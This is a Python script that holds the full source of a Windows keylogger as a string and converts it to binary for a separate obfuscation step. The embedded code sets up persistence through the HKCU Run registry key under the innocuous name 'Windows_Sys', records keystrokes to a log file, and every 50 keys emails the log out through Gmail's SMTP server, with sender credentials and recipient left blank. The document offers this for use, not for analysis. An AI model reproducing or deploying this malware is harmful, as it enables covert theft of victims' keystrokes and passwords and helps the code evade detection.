#code stored as a string
code = """


email_count = 0

#function allows for this program to be persistent across multiple boots of a machine
def Add_To_Startup():
    #specify folder path of current location
    pth = os.path.dirname(os.path.realpath(__file__))

    #name of executable that will be created(this is what will run on boot)
    script_name = "malware_part_2.exe"

    #joins script_name to the folder path
    address = os.path.join(pth, script_name)

    #key we want to change is HKEY_CURRENT_USER
    #key value is Software\Microsoft\Windows\CurrentVersion\Run
    hkey_value = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

    #open the key so changes can be made
    value = winreg.OpenKey(winreg.HKEY_CURRENT_USER, hkey_value, 0, winreg.KEY_ALL_ACCESS)

    #modify the key to specifiy the program("Windows_Sys" is the name that will show)
    winreg.SetValueEx(value,"Windows_Sys", 0, winreg.REG_SZ, '"'+address+'"')

   #close the key 
    winreg.CloseKey(value)

                    
Add_To_Startup()

#function defines actions on the key press
def on_press(key):
    global email_count
    email_count += 1

    write_file(key)

    if (email_count >= 50):
        email()
        email_count = 0
        clear_file()


    if key == Key.esc:
        email()
        clear_file()
        return False

#function writes each key to a file
def write_file(key):
    #gives the path of the directory this program is in
    pth = os.path.dirname(os.path.realpath(__file__))
    
    #specify the name of the file to write to
    file_name = "log.txt"

    #combines the previous two varibales to get the full path of the log.txt file
    address = os.path.join(pth,file_name)

    #open file in append mode
    with open(address, "a") as f:

        #replace single quotes with nothing
        k = str(key).replace("'","")

        #Key.Space will now be logged as a space
        if k == "Key.space":
            f.write(' ')

        #Key.backspace will now be logged as an asterisk (*)
        if k == "Key.backspace":
            f.write('*')

        #Key.enter will now be logged as a space
        if k == "Key.enter":
            f.write(' ')

        #will exclude all other "non-standard" keys that begin with "Key"
        #and write only the "normal", alpahbetical keys
        elif k.find("Key") == -1:
            f.write(k)

#function clears the log.txt file to prep it for its next use
def clear_file():
    #exact same method of obtaining log.txt file path as write_file()
    pth = os.path.dirname(os.path.realpath(__file__))
    file_name = "log.txt"
    address = os.path.join(pth,file_name)

    #clears the log file
    with open(address, "r+") as f:
        f.truncate(0)
        f.seek(0)

#function allows for data exfiltration via email
def email():
    #specifies the new email that has been made to send emails(fill in)
    email_user = ""
    
    #specifies the password for the new email(fill in)
    email_password = ""

    #specifies the email to send to(fill in)
    email_send = ""

    #specifies the subject of the email
    subject = 'Statistics'



    #Create a multipart message to set headers for the email
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    #Add a body to the message for the email
    body = 'Hi there, sending this email with Python!'
    msg.attach(MIMEText(body,'plain'))

    # Specifiy a file to open as well as open it in read-only, binary mode
    pth = os.path.dirname(os.path.realpath(__file__))
    file_name = "log.txt"
    address = os.path.join(pth,file_name)

    with open(address,'rb') as f:
        file_attachment = MIMEApplication(f.read())
        file_attachment.add_header('Content-Disposition', "attachment; filename= "+address)

        msg.attach(file_attachment)
    email_string = msg.as_string()



    #server start up and login
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)

    #send the email with the following information(email_string is the whole msg that have been converted to a string value)
    server.sendmail(email_user, email_send, email_string)
    server.quit()

    
with Listener(on_press=on_press) as listener:
    listener.join()

"""

#turns the code string into binary
binary_code = ' '.join(format(ord(c), 'b') for c in code)

#prints the binary so it can be copied and used in the obfuscation program
print(binary_code)

